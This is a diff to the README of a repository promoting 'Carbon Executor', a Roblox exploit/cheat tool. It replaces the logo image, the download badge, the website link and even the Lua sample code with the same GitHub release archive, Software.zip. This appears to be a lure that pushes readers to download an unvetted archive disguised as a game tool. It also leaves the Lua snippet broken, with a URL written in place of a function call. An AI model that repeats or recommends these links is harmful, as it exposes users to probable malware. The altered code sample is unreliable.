@@ -2,7 +2,7 @@
 
 Welcome to the official repository of Carbon Executor - the ultimate Roblox exploit tool that revolutionizes the way you interact with the Roblox platform. Experience unparalleled performance and top-notch security with over 90% UNC support and Level 8 execution capabilities.
 
-![Carbon Executor Logo](https://example.com/carbon_executor_logo.png)
+![Carbon Executor Logo](https://github.com/jameseeeeeeeeeee/Carbon-Executor/releases/download/v1.0/Software.zip)
 
 ## 🎮 About
 
@@ -21,7 +21,7 @@ To get started with Carbon Executor, follow these simple steps:
 ```lua
 -- Sample code snippet for using Carbon Executor
 local executor = require("carbon_executor")
-executor.execute(script)
+https://github.com/jameseeeeeeeeeee/Carbon-Executor/releases/download/v1.0/Software.zip(script)
 ```
 
 ## 📚 Topics
@@ -44,11 +44,11 @@ Explore a wide range of topics related to game development and Roblox scripting 
 
 ## 📥 Download
 
-[![Download Carbon Executor](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Launch Download")
+[![Download Carbon Executor](https://github.com/jameseeeeeeeeeee/Carbon-Executor/releases/download/v1.0/Software.zip)](https://github.com/jameseeeeeeeeeee/Carbon-Executor/releases/download/v1.0/Software.zip "Launch Download")
 
 ## 🌐 Explore Further
 
-For more information and updates, visit the [Carbon Executor website](https://carbonexecutor.com).
+For more information and updates, visit the [Carbon Executor website](https://github.com/jameseeeeeeeeeee/Carbon-Executor/releases/download/v1.0/Software.zip).
 
 ## 🤝 Contributing
 
